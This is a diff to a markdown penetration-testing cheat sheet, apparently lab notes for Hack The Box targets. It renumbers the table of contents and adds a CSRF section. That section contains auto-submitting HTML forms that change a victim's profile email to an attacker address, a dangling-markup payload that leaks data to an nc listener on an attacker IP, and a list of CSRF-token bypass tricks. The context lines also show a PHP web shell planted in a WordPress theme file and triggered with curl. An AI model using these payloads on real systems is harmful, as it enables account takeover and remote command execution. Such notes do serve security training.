@@ -25,9 +25,10 @@ Overview
 21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
 22. - [File Inclusion](#22---file-inclusion)
 23. - [Session Hijacking](#23---session-hijacking)
-24. - [Session Hijacking](#24---session-fixation)
-25. - [WordPress](#25---wordpress) 
-26. - [Exploit Research](#26---exploit-research)
+24. - [Session Fixation](#24---session-fixation)
+25. - [Cross-Site Request Forgery](#25---cross-site-request-forgery-csrf)
+26. - [WordPress](#26---wordpress) 
+27. - [Exploit Research](#27---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1731,7 +1732,76 @@ select * from all_sessions;
 select * from all_sessions where id=3;
 ```
 
-#25. - WordPress
+#25. - Cross-Site Request Forgery (CSRF)
+-----------------------------------------
+
+- CSRF HTML (notmalicious.html)
+
+```
+# Listen $ python -m http.server 1337
+
+<html>
+  <body>
+    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+
+# Browse to http://<IP address>:1337/notmalicious.html
+```
+
+- CSRF GET (notmalicious_get.html)
+
+```
+# Listen $ python -m http.server 1337
+
+<html>
+  <body>
+    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
+      <input type="hidden" name="email" value="attacker@htb.net" />
+      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
+      <input type="hidden" name="country" value="CSRF_POC" />
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.getElementById("submitMe").submit()
+    </script>
+  </body>
+</html>
+
+# Browse to http://<IP address>:1337/notmalicious_get.html
+```
+
+- CSRF POST
+
+```
+# Listen $ nc -nlvp 8000
+
+<table%20background='%2f%2f<IP address>:8000%2f
+
+# Browse to http://<URL>/app/delete/%3Ctable background='%2f%2f<IP address>:8000%2f
+```
+
+- CSRF Protection Bypasses
+
+```
+Null Value e.g. CSRF-Token:
+Random CSRF Token e.g. CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
+Use Another Session’s CSRF Token e.g. CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331
+Request Method Tampering e.g. Try GET and POST
+Delete the CSRF token parameter or send a blank token e.g. new_password=qwerty OR e.g. new_password=qwerty&csrf_token=
+```
+
+#26. - WordPress
 -----------------------------------------
 
 - Version Enumeration
@@ -1793,7 +1863,7 @@ system($_GET['cmd']);
 $ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
-#26. - Exploit Research
+#27. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
